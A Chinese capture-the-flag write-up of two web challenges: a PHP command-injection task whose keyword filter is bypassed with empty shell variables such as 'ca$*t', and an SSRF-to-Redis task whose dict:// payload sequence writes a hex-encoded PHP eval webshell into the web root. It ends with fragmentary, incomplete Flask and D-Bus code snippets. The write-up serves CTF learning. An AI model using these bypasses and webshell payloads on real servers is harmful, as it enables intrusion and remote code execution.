0x01 前言

由于比赛前半天有考试和某些事情，导致开始做的时候，队友已经输出两个了（RE的！）tql。

当时发现有三道简单web，是有思路的，但就是脑子有点糊，然后一个队友re的做出两道web。。。剩下一个简单的，被另一个web的师傅做出来了，剩下的那个难的，也是无从下手，坐牢。。。下面凭借印象和队友的wp学习一番

0x02 easyweb

这道题记得先是扫了个目录，然后发现一些敏感信息，从源码能读到zip的泄露，下载就是某个页面的源码，代码如下：

   <?php
    if (isset($_GET['id']) && floatval($_GET['id']) !== '1' && $_GET['id'] == 1) 
    {
    echo 'welcome,admin';
    $_SESSION['admin'] = True;
    } 
    else 
    {
      die('flag?');
    }
    ?>
    <?php
    if ($_SESSION['admin']) 
    {
      if(isset($_POST['code']))
      {
      if(preg_match("/(ls|c|a|t| |f|i|n|d')/", $_POST['code'])==1)
      echo 'no!';
      elseif(preg_match("/[@#%^&*()|\/?><']/",$_POST['code'])==1)
      echo 'no!';
else
system($_POST['code']);
      }
    }
    ?>

开始的话给id赋值为1.0即可绕过。

第二部分就是绕过正则了，当时最开始想的自增绕过，但最后搞完了发现，用的是system函数。。。然后回到最开始，思考如何绕过的时候，队友给了思路：空变量绕过

空变量

这思路之前也没用过，学习一下，有的文章这样介绍

$*和$@，$x(x 代表 1-9),${x}(x>=10) :

比如ca${21}t a.txt表示cat a.txt 在没有传入参数的情况下，这些特殊字符默认为空，如下:

wh$1oami
who$@ami
whoa$*mi
ca$*t fl$*ag
ca$@t fl$@ag
ca$5t f$5lag
ca${2}t f${2}lag

然后我们可以直接键入code=l${1}s，就相当于code=ls，绕过之后，页面回显718g，当时我以为是个目录还是什么的，又想着怎么才能继续读取这个目录，结果师傅告诉我直接访问就行了。。。。尬住了

不过除了这个方法，我猜测还有很多，这里还可以l\s绕过，\s结合在一起，也就是一个可有可无的存在，这里无非就是一个转义符的意思，将s认为是普通字符，即使没有，s也是一个普通字符。不过这样写的话，可以绕过。

0x03 Tantantan

这道题是很常规的ssrf打redis，由于没环境了，我借用师傅们的截图

首页访问首页，让我们键入xss，我这里随便输入了之后，看了源码，得到另一个路由，访问即可

到了这个页面，直觉告诉我们可以伪协议读取看看，然后发现是可以的：file:///var/www/html/index.php，得到源码发现和ssrf有关

然后就是常规的端口探测，这里我用dict协议，探到6379端口发现有回显。

然后常规的web路径写shell即可，这里我也是遇到了新东西，当时是直接尝试gopher协议打的，但是发送了之后没回显，后来感觉是url编码次数的问题，应该是编码两次的。

然后新的知识是，在hackbar中，直接set:1:shell.php，用冒号代替空格即可。同时在后续写一句话木马的时候，需要转hex才可，不然写入key的时候，可能会识别不正常，到了PHP处理器那里，会自动将这段十六进制数据转为对应的字符串

最终payload如下

data=dict://127.0.0.1:6379/info
data=dict://127.0.0.1:6379/config:set:dir:/var/www/html
data=dict://127.0.0.1:6379/set:shell:"\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b\x3f\x3e"
data=dict://127.0.0.1:6379/config:set:dbfilename:1.php
data=dict://127.0.0.1:6379/save

最后命令执行即可

    return "flag被我藏起来了,/look一下file看看呢"

@app.route('/look', methods=['GET', 'POST'])

    if request.values.get('file'): 
        file = request.values.get('file') 
        f= open(file,encoding='utf-8') 
        content=f.read() f.close() 
        if 'flag' in content: 
            return "打卡下班"+content 
        else: 
            return "抓紧找，着急下班"+content

class MyDBusService(dbus.service.Object):

    @dbus.service.method("ctf.syncServer", in_signature='', out_signature='s')

    @dbus.service.method("ctf.syncServer", in_signature='ss', out_signature='s')

        global secretKey
        if username in loginList and key == secretKey:

            return str(data)
        return "keyError"
